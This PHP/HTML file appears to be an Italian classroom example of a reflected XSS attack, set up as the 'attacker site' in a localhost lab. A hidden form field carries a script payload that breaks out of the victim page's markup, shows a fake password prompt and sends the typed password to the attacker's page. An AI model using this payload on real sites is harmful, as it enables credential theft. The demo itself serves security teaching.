<?php
$script = "</h1><script>setTimeout(function (){let c=prompt('Inserisci la password');window.location.href='http://127.0.0.1/esempio21_7_XSS_Attack_POST_SitoAttaccante.php?c='.concat(c.replaceAll(' ','_'));}, 3000);
</script>";
?>

<html>
    <head>
        <title>XSS Attack - Attacker page (POST)</title>
    </head>
    <body bgcolor="#ffb3ff">
        <h3>XSS attack verso un sito non sicuro (sito attaccante)</h3><br>
        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer malesuada, est ac cursus fermentum, dolor eros pretium ante, eu aliquet lacus risus vitae ex. Aliquam ipsum est, fringilla at ligula eget, feugiat tempor diam. Etiam sit amet congue dolor. Donec gravida nibh nunc, sed pellentesque risus efficitur quis. Interdum et malesuada fames ac ante ipsum primis in faucibus. Duis tempor sit amet nibh eu mattis. Nullam viverra facilisis leo, ultricies vestibulum augue fringilla sed. Sed feugiat convallis felis vel laoreet. Nam quam ligula, blandit quis commodo eu, mollis id nisl. Phasellus id ultricies velit, eu lacinia elit.
        <br>
        <br>
        <form id="myForm" action="http://127.0.0.1/esempio21_5_XSS_Attack_POST_SitoVittima.php" method="POST">
            <input type="hidden" name="id" value="1<?= $script ?>"/>
            <button type="submit">Clicca qui per collegarti al sito</button>
        </form>
    </body>
</html>